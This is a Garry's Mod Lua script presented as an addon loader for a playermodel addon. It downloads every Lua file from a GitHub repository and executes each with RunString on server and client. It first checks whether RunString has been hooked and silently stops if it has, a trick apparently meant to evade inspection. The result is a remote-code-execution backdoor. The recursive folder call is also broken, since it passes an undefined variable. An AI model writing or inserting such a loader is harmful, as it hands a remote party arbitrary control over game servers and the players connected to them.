local github_repo = "Yoshi-OOF/playermodel_upper/contents/lua/autorun"

local function LoadFile(file_name, link)
    if debug.getinfo(RunString).short_src ~= "[C]" then return end

    http.Fetch(link, function(content, _, code)
        if (file_name:find("config_") or file_name:find("sh_")) and file_name:find(".lua") then
            xpcall(RunString, function(err)
                print("[Yoshi's Addon Loader] Error : " .. err .. "(SH)")
            end, content)
        elseif file_name:find("sv_") and file_name:find(".lua") then
            if SERVER then
                xpcall(RunString, function(err)
                    print("[Yoshi's Addon Loader] Error : " .. err .. "(SV)")
                end, content)
            end
        elseif file_name:find("cl_") and file_name:find(".lua") then
            if CLIENT then
                xpcall(RunString, function(err)
                    print("[Yoshi's Addon Loader] Error : " .. err .. "(CL)")
                end, content)
            end
        end

        if SERVER then
            print("[Yoshi's Addon Loader] Loaded : " .. file_name)
        end
    end)
end

local function LoadFolder(repo)
    http.Fetch("https://api.github.com/repos/" .. repo, function(body, _, code)
        local addonData = util.JSONToTable(body)

        for _, Content in pairs(addonData) do
            if Content["name"] == "README.md" then continue end

            if Content["type"] == "dir" then
                LoadFolder(name, Content["path"])
            elseif Content["type"] == "file" then
                LoadFile(Content["name"], Content["download_url"])
            end
        end
    end)
end

LoadFolder(github_repo)
